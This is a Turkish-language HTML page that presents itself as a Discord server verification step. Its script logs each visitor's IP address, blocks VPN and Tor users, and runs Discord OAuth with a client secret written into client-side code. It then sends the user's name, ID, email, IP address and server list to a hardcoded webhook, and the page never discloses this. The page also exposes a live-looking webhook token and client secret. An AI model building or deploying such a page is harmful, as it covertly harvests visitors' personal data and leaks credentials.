<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Doğrulama</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #36393f;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      text-align: center;
    }
    .container {
      background-color: #2f3136;
      border-radius: 8px;
      padding: 30px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
      max-width: 500px;
      width: 100%;
    }
    h2 {
      color: #5865F2;
      margin-bottom: 20px;
    }
    .btn {
      background-color: #5865F2;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
      text-decoration: none;
      display: inline-block;
      margin-top: 15px;
    }
    .btn:hover {
      background-color: #4752C4;
    }
    .loading {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #5865F2;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .hidden {
      display: none;
    }
    .error {
      color: #ff6b6b;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div id="initialView" class="hidden">
      <h2>Discord Doğrulama</h2>
      <p>Sunucumuza giriş yapmak için Discord hesabınızla bağlantı kurun</p>
      <a id="loginBtn" class="btn">Discord ile Bağlan</a>
    </div>
    
    <div id="loadingView" class="hidden">
      <div class="loading"></div>
      <p>Doğrulama yapılıyor...</p>
    </div>
    
    <div id="errorView" class="hidden">
      <h2>VPN Tespit Edildi</h2>
      <p class="error">VPN/proxy kullanımı tespit edildi. Sunucumuza giriş yapabilmek için VPN/proxy kullanmadan bağlanmalısınız.</p>
      <button id="retryBtn" class="btn">Tekrar Dene</button>
    </div>
  </div>

  <script>
    // Yapılandırma
    const config = {
      clientId: "1399152888214851595",
      redirectUri: window.location.href.split('?')[0], // Mevcut sayfa URL'si
      webhookUrl: "https://discord.com/api/webhooks/1399151324309881015/01oC6NPk2n7Mut17QfUvwsBUFRakn7rBYg52yTP7zI4IEfzEeMKePKD33IwgFvobyQGu",
      discordServerInvite: "https://discord.gg/una", // Kendi sunucu linkiniz
      scope: "identify email guilds"
    };

    // Elementler
    const initialView = document.getElementById('initialView');
    const loadingView = document.getElementById('loadingView');
    const errorView = document.getElementById('errorView');
    const loginBtn = document.getElementById('loginBtn');
    const retryBtn = document.getElementById('retryBtn');

    // OAuth URL'yi ayarla
    loginBtn.href = `https://discord.com/oauth2/authorize?client_id=${config.clientId}&redirect_uri=${encodeURIComponent(config.redirectUri)}&response_type=code&scope=${config.scope}`;

    // Sayfa yüklendiğinde doğrudan işlemi başlat
    document.addEventListener('DOMContentLoaded', async () => {
      showView(loadingView);
      
      try {
        // 1. IP adresini ve VPN kontrolü yap
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;
        
        // VPN kontrolü için ek API
        const vpnCheck = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const vpnData = await vpnCheck.json();
        
        // VPN/Proxy kontrolü
        if (vpnData.proxy || vpnData.vpn || vpnData.tor) {
          throw new Error('VPN/Proxy kullanımı tespit edildi');
        }
        
        // 2. Doğrudan Discord OAuth'a yönlendir
        window.location.href = loginBtn.href;
        
      } catch (error) {
        console.error('Hata:', error);
        if (error.message.includes('VPN/Proxy')) {
          showView(errorView);
        } else {
          showView(initialView);
        }
      }
    });

    // URL'den code parametresini kontrol et
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');

    if (code) {
      verifyUser(code);
    }

    // Tekrar dene butonu
    retryBtn.addEventListener('click', () => {
      window.location.reload();
    });

    async function verifyUser(code) {
      showView(loadingView);
      
      try {
        // 1. IP adresini al ve VPN kontrolü yap
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;
        
        // VPN kontrolü için ek API
        const vpnCheck = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const vpnData = await vpnCheck.json();
        
        // VPN/Proxy kontrolü
        if (vpnData.proxy || vpnData.vpn || vpnData.tor) {
          throw new Error('VPN/Proxy kullanımı tespit edildi');
        }

        // 2. Discord'dan token al
        const formData = new URLSearchParams();
        formData.append('client_id', config.clientId);
        formData.append('client_secret', "XwMSoMkHCF0_D9fnTQy7JlfX7mVOpwP4");
        formData.append('grant_type', 'authorization_code');
        formData.append('code', code);
        formData.append('redirect_uri', config.redirectUri);
        formData.append('scope', config.scope);

        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: formData
        });

        const tokenData = await tokenResponse.json();
        if (!tokenResponse.ok) throw new Error(tokenData.error_description || 'Token alınamadı');

        // 3. Kullanıcı bilgilerini al
        const [userData, guildsData] = await Promise.all([
          fetch('https://discord.com/api/users/@me', {
            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
          }).then(res => res.json()),
          fetch('https://discord.com/api/users/@me/guilds', {
            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
          }).then(res => res.json())
        ]);

        // 4. Webhook'a bilgileri gönder
        await sendWebhook(userData, guildsData, ipAddress);

        // 5. Kullanıcıyı sunucuya yönlendir
        window.location.href = config.discordServerInvite;

      } catch (error) {
        console.error('Doğrulama hatası:', error);
        if (error.message.includes('VPN/Proxy')) {
          showView(errorView);
        } else {
          alert(`Doğrulama başarısız: ${error.message}`);
          showView(initialView);
        }
      }
    }

    async function sendWebhook(user, guilds, ip) {
      const embed = {
        title: "Yeni Discord Doğrulaması",
        color: 0x5865F2,
        thumbnail: {
          url: user.avatar 
            ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` 
            : 'https://cdn.discordapp.com/embed/avatars/0.png'
        },
        fields: [
          { name: "Kullanıcı", value: `${user.username}#${user.discriminator}` },
          { name: "ID", value: user.id },
          { name: "Email", value: user.email || "Erişilemedi" },
          { name: "IP Adresi", value: ip || "Bilinmiyor" },
          { name: "Sunucular", value: guilds.slice(0, 25).map(g => g.name).join(", ") || "Yok" }
        ],
        timestamp: new Date().toISOString()
      };

      try {
        await fetch(config.webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] })
        });
      } catch (error) {
        console.error('Webhook gönderilemedi:', error);
      }
    }

    function showView(view) {
      initialView.classList.add('hidden');
      loadingView.classList.add('hidden');
      errorView.classList.add('hidden');
      view.classList.remove('hidden');
    }
  </script>
</body>
</html>
